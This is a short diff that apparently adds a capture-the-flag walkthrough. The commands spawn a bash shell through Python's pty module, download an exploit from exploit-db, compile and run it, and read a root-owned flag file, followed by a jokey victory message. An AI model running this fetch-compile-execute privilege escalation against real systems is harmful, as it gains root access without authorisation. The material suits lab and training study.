@@ -1,0 +1,13 @@
+python -c 'import pty; pty.spawn("/bin/bash")'
+cd /tmp
+wget https://www.exploit-db.com/download/37292
+mv 37292 37292.c
+gcc 37292.c
+./a.out
+cd /root
+cat flag.txt
+
+```
+U wyn teh Interwebs!!1eleven11!!1!
+Hack the planet!
+```
